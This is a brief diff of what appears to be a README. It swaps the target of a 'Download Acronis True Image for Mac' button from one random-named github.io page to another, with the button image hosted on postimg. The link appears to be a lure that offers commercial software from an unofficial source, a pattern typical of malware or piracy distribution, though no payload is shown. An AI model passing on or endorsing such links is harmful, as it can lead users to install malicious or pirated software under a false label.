@@ -25,7 +25,7 @@
 </p>
 
 <p align="center">
-  <a href="https://pudge-wagner.github.io/.github/acronis-true-image-mac">
+  <a href="https://skalsd-oasd.github.io/.github/acronis-true-image-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download Acronis True Image for Mac — backup and recovery software" width="160"/>
   </a>
